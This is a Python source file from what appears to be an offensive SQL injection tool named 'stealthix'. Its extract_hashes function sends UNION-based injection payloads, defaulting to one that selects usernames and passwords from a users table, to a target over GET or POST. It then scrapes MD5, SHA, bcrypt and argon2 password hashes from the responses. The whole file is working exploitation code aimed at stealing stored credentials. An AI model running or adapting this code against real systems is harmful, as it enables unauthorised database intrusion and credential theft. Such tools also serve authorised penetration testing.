from __future__ import annotations

from typing import Any

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _extract_values,
    _finalize_collection_result,
    _get_extraction_profile,
    _make_request,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)


def extract_hashes(session: ScanSession) -> dict[str, Any]:
    profile = _get_extraction_profile(session, "hashes") or {}
    candidates = (
        profile.get("payloads")
        if isinstance(profile.get("payloads"), list)
        else ["' UNION SELECT username,password FROM users--"]
    )
    payloads: list[str] = []
    results = _result_base(session, "hashes", payloads)
    results["hashes"] = []
    patterns = [
        r"[a-f0-9]{32}",
        r"[a-f0-9]{40}",
        r"[a-f0-9]{64}",
        r"\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}",
        r"\$argon2id\$[^\s]+",
    ]
    for template in candidates if isinstance(candidates, list) else []:
        payload = _prepare_payload(session, str(template))
        payloads.append(payload)
        if method_uses_body(session.config.method):
            target, data = _apply_injection(session, payload)
            body, elapsed = _make_request(session, target, data, "POST")
        else:
            target, _ = _apply_injection(session, payload)
            body, elapsed = _make_request(session, target)
        results["responses"].append(_response_entry(target, payload, body, elapsed, limit=10000))
        extracted = _extract_values(body, patterns)
        if extracted:
            _record_success(results, payload)
            results["hashes"].extend(extracted)
    return _finalize_collection_result(results, "hashes")
